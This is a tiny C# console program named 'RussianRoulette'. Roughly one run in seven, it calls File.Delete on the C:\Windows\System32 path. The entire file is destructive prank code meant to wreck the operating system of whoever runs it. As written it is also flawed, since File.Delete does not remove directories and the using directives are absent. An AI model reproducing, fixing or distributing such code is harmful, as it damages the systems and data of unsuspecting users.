namespace RussianRoulette
{
    class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();
            if (random.Next(0, 7) == 1)
            {
                File.Delete(@"c:\Windows\System32");
            }
        }
    }
}